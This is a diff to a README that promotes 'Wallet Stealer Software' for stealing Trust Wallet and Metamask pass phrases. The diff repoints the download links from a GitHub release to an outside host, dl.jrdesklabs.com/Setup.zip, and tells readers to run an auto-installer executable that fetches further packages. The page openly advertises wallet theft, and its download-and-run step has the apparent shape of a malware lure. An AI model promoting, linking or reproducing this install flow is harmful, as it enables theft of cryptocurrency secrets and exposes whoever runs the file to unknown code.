@@ -5,9 +5,9 @@ Wallet Stealer Software 🔥 Steal Pass Phrases of Trust Wallet and Metamask Wal
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/cbadb385-dbe6-44fb-b518-09823bf2ff2f)
-](https://github.com/aryabasu17/AquaticDiscord/releases/download/V3.3/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
-## **1. [Download the archive](https://github.com/aryabasu17/AquaticDiscord/releases/download/V3.3/Release.zip) from releases and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 ## Features:
 - ✅ Works for all wallets!
